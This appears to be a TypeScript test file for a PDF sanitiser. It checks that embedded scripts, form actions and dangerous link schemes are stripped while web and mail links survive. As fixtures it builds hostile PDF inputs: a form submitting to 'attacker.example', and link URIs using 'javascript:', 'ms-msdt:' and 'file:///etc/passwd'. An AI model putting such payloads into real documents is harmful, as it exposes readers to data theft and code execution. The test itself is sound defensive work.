import { PDFArray, PDFDict, PDFDocument, PDFName, PDFString } from "pdf-lib";
import type { PDFObject } from "pdf-lib";
import { expect, test } from "vitest";

import { saveSwept } from "@/lib/pdf/output-gc";

import { pdfContainsText } from "./pdf-scan";

const lookupDict = (doc: PDFDocument, value: PDFObject | undefined): PDFDict =>
  doc.context.lookup(value, PDFDict);

test("scripts and form actions are removed, links and page jumps kept", async () => {
  const doc = await PDFDocument.create();
  const page = doc.addPage([200, 200]);
  const { context } = doc;
  const script = (js: string) =>
    context.obj({ JS: PDFString.of(js), S: "JavaScript" });

  page.node.set(PDFName.of("AA"), context.obj({ O: script("pageOpenScript") }));
  // A field that only an action points at, as on a page left out of an
  // extract.
  const otherField = context.register(
    context.obj({
      FT: "Tx",
      T: PDFString.of("other"),
      V: PDFString.of("Private value"),
    })
  );
  const reset = context.register(
    context.obj({ Fields: [otherField], S: "ResetForm" })
  );
  const link = context.register(
    context.obj({
      A: {
        Next: [script("chainedScript"), { N: "NextPage", S: "Named" }],
        S: "URI",
        URI: PDFString.of("https://example.com"),
      },
      Rect: [0, 0, 10, 10],
      Subtype: "Link",
    })
  );
  const button = context.register(
    context.obj({
      A: reset,
      AA: { K: script("keystrokeScript") },
      FT: "Btn",
      Rect: [20, 0, 30, 10],
      Subtype: "Widget",
    })
  );
  const submit = context.register(
    context.obj({
      A: { F: PDFString.of("https://attacker.example"), S: "SubmitForm" },
      FT: "Btn",
      Rect: [40, 0, 50, 10],
      Subtype: "Widget",
    })
  );
  page.node.set(PDFName.of("Annots"), context.obj([link, button, submit]));
  doc.catalog.set(PDFName.of("OpenAction"), script("openScript"));

  const bytes = await saveSwept(doc);

  const left = await Promise.all(
    [
      "pageOpenScript",
      "chainedScript",
      "keystrokeScript",
      "openScript",
      "attacker.example",
      "Private value",
    ].map((text) => pdfContainsText(bytes, text))
  );
  expect(left).toEqual([false, false, false, false, false, false]);
  const reloaded = await PDFDocument.load(bytes);
  const [annots] = reloaded.getPages().map((item) => item.node.Annots());
  expect(annots?.size()).toBe(3);
  const linkAction = lookupDict(
    reloaded,
    lookupDict(reloaded, annots?.get(0)).get(PDFName.of("A"))
  );
  expect(linkAction.get(PDFName.of("URI"))).toEqual(
    PDFString.of("https://example.com")
  );
  const next = linkAction.lookup(PDFName.of("Next"), PDFArray);
  expect(next.size()).toBe(1);
});

test("only web and mail links stay in the file, in /A and in /Next", async () => {
  const doc = await PDFDocument.create();
  const page = doc.addPage([200, 200]);
  const { context } = doc;
  const uri = (address: string) =>
    context.obj({ S: "URI", URI: PDFString.of(address) });
  const link = (action: PDFObject) =>
    context.register(
      context.obj({ A: action, Rect: [0, 0, 10, 10], Subtype: "Link" })
    );
  const chained = uri("https://example.com/first");
  chained.set(
    PDFName.of("Next"),
    context.obj([uri("file:///etc/passwd"), uri("mailto:a@example.com")])
  );
  page.node.set(
    PDFName.of("Annots"),
    context.obj([
      // oxlint-disable-next-line eslint/no-script-url -- the test checks this is dropped
      link(uri("javascript:alert(1)")),
      link(uri("ms-msdt:/id")),
      link(uri("mailto:b@example.com")),
      link(chained),
    ])
  );

  const reloaded = await PDFDocument.load(await saveSwept(doc));
  const [annots] = reloaded.getPages().map((item) => item.node.Annots());
  const addresses = (annots?.asArray() ?? []).map((entry) => {
    const action = lookupDict(reloaded, entry).lookupMaybe(
      PDFName.of("A"),
      PDFDict
    );
    const next = action?.lookupMaybe(PDFName.of("Next"), PDFArray);
    return [action, ...(next?.asArray() ?? [])].map((item) =>
      item
        ? lookupDict(reloaded, item).lookup(PDFName.of("URI"))?.toString()
        : null
    );
  });

  expect(addresses).toEqual([
    [null],
    [null],
    ["(mailto:b@example.com)"],
    ["(https://example.com/first)", "(mailto:a@example.com)"],
  ]);
});
